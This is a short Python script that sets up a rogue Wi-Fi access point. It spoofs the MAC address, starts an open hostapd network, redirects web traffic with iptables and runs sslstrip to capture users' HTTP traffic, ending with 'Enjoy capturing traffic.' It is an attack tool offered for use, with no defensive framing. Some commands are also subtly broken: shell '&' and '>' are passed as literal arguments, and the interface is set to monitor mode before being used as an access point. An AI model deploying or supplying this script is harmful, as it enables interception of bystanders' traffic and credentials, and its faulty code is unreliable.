import subprocess

# Set the wireless interface to monitor mode
subprocess.run(["ifconfig", "wlan0", "down"])
subprocess.run(["iwconfig", "wlan0", "mode", "monitor"])
subprocess.run(["ifconfig", "wlan0", "up"])

# Change MAC address
subprocess.run(["ifconfig", "wlan0", "down"])
subprocess.run(["macchanger", "-r", "wlan0"])
subprocess.run(["ifconfig", "wlan0", "up"])

# Configure hostapd for creating the rogue AP
hostapd_conf = '''
interface=wlan0
driver=nl80211
ssid=RogueAP
channel=6
'''
with open("/etc/hostapd/hostapd.conf", "w") as f:
    f.write(hostapd_conf)

# Start the rogue AP
subprocess.run(["hostapd", "/etc/hostapd/hostapd.conf", "&"])

# Enable IP forwarding
subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

# Set up iptables for traffic redirection
subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])

# Start sslstrip to capture HTTP traffic
subprocess.run(["sslstrip", "-l", "8080", "&"])

print("Rogue AP created successfully! Enjoy capturing traffic.")